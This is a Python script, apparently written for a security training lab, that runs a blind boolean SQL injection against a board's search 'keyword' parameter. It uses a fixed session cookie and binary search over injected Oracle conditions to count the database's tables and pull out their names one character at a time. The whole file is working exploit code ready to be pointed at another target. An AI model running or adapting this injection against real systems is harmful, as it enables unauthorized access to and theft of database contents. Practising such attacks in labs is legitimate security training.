import requests

base_url = "https://lab.eqst.co.kr:8442/exam5/free"

headers = {
    "Cookie": "JSESSIONID=F0A0FAD924E209A061EF9FF55C6DA914"
}

params_template = {
    "page": "1",
    "sorting": "",
    "sortingAd": "",
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": ""  
}

def check_condition(injected_sql):
    params = params_template.copy()
    params["keyword"] = injected_sql
    try:
        r = requests.get(base_url, params=params, headers=headers)
        r.raise_for_status()
        return '<tr class="notice">' in r.text
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

def get_table_count(max_count=100):
    print("테이블 개수 추출을 시작합니다...")
    low, high = 0, max_count
    count = 0
    while low <= high:
        mid = (low + high) // 2
        if mid == 0:
            low = mid + 1
            continue
        params = f"usagi cute%' AND (SELECT COUNT(*) FROM user_tables)>{mid-1} AND 'j%'='j"
        if check_condition(params):
            count = mid
            low = mid + 1
        else:
            high = mid - 1
    return count

def extract_table_name(table_idx, max_len=30):
    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            params = f"usagi cute%' AND ASCII(SUBSTR((SELECT table_name FROM (SELECT table_name, ROWNUM r FROM (SELECT table_name FROM user_tables ORDER BY table_name)) WHERE r={table_idx}),{pos},1))>{mid} AND 'j%'='j"
            if check_condition(params):
                low = mid + 1
            else:
                high = mid - 1
        
        if 32 <= low <= 126:
            result += chr(low)
        else:
            break
    return result
